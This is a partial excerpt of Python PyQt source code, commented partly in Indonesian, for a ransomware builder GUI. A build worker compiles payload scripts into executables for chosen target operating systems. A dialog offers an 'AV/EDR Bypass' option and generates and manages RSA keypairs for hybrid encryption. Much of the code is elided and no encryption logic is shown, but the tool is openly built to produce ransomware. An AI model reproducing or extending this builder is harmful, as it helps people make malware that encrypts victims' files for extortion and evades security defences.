...
class RansomwareBuildWorker(QThread):
    ...
    def run(self):
        try:
            ...
            # ═══════════════════════════════════════════════════════════
            # ✅ FIX: Strip extension dari base_filename dulu
            # ═══════════════════════════════════════════════════════════
            ...
            if output_format == "exe":
                ...
                # ═══ FIX: Pre-check PyInstaller ═══
                self.output.emit("[*] Checking PyInstaller availability...")
                try:
                    import PyInstaller  # noqa

                    self.output.emit(
                        f"[+] PyInstaller: {getattr(PyInstaller, '__version__', 'unknown')}"
                    )
                except ImportError:
                    self.output.emit("[!] PyInstaller not installed")
                    self.output.emit("[!] Install: pip install pyinstaller")
                ...
                exe_path, error = builder.build_exe(
                    result["script"],
                    clean_base,  # ✅ pakai clean_base (tanpa ext)
                    icon_file,
                    output_dir=self.output_path,
                    target_os=target_os,
                )
...
class RansomwareDialog(QDialog):
    ...
    def _build_config_panel(self):
        ...
        # ═══════════════ AV BYPASS ═══════════════
        av_group = QGroupBox("🛡️ AV/EDR Bypass")
    ...
    def _generate_keypair(self):
        ...
        reply = QMessageBox.question(
            ...
            "⚠️  Ini akan MENGGANTI keypair yang ada.\n"
            "Pastikan Anda sudah menyimpan keypair lama.",
    ...
    def _on_keypair_generated(self, success, private_pem, public_pem):
        ...
        self.rsa_status.setStyleSheet(
            ...
            "padding: 6px; background: rgba(80, 250, 123, 0.1); border-radius: 3px;"
        )
    ...
    def _view_keypair(self):
        ...
        warn.setStyleSheet(
            "color: #ff5555; font-size: 10pt; font-weight: bold; padding: 8px; "
            "background: rgba(255, 85, 85, 0.1); border: 1px solid #ff5555; "
            "border-radius: 4px;"
        )
        warn.setWordWrap(True)
    ...
    def _clear_keypair(self):
        reply = QMessageBox.question(
            ...
            "⚠️  Jika belum disimpan, keypair akan HILANG.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply != QMessageBox.StandardButton.Yes:
            return
    ...
    def _update_exe_status(self):
        ...
        # Strip extension dari nama file
        ...
        if target_os == "windows" and host_os != "windows":
            ...
            self.format_status.setText(
                f"✅ EXE - {host_os.upper()} → {target_os.upper()} → {display_name}"
            )
            self.format_status.setStyleSheet(
                "color: #50fa7b; font-size: 8pt; padding: 4px; "
                "background: rgba(80, 250, 123, 0.1); border: 1px solid #50fa7b; "
                "border-radius: 3px;"
            )
    ...
    def _generate(self):
        ...
        if use_hybrid and not self.rsa_private_pem:
            reply = QMessageBox.question(
                self,
                "No Keypair",
                "Belum ada RSA keypair.\n\nGenerate otomatis sekarang?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            )
            if reply == QMessageBox.StandardButton.Yes:
        ...
        # ═══ Strip extension dari file_name ═══
        file_name = self.file_name_input.text().strip() or "payload"
        for old_ext in [".py", ".exe", ".app", ".bin"]:
        ...
        # ═══════════════════════════════════════════════════════════
        # ✅ FIX P0: BLOCK cross-compile SEBELUM start build
        # ═══════════════════════════════════════════════════════════
        host_os = _platform.system().lower()
        ...
        if format_type == "exe" and target_os == "windows" and host_os != "windows":
            reply = QMessageBox.critical(
                ...
                f"You are on <b>{host_os.upper()}</b> but target is <b>Windows</b>.<br><br>"
                f"<b>PyInstaller CANNOT cross-compile.</b><br><br>"
                f"Options:<br>"
                f"  • Change target OS to <b>{host_os}</b> for local binary<br>"
                f"  • Use <b>Python output</b> (works on all OS)<br>"
                f"  • Run this GUI on a <b>Windows machine</b> for Windows EXE<br><br>"
                f"Build will NOT continue.",
            )
            return

        # ═══ Build full filename ═══
        ext_map = {"python": ".py", "windows": ".exe", "macos": ".app", "linux": ""}
            ...
            if full_result:
                ...
                if full_result.get("rsa_private_key_pem"):
                    self.privkey_status.setText(
                        f"✅ Private key: {len(full_result['rsa_private_key_pem']):,} chars"
                    )
                    self.privkey_status.setStyleSheet(
                        "color: #50fa7b; font-size: 9pt; padding: 6px; "
                        "background: rgba(80, 250, 123, 0.1); border-radius: 3px;"
                    )
    ...
    def closeEvent(self, event):
        if self.rsa_private_pem:
            reply = QMessageBox.question(
                self,
                "⚠️ Warning",
                "RSA keypair masih ada di memory.\n\n"
                "Sudah Anda save ke file?\n\n"
                "Keluar tanpa save = KEYPAIR HILANG!",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            )
            if reply != QMessageBox.StandardButton.Yes:
                event.ignore()
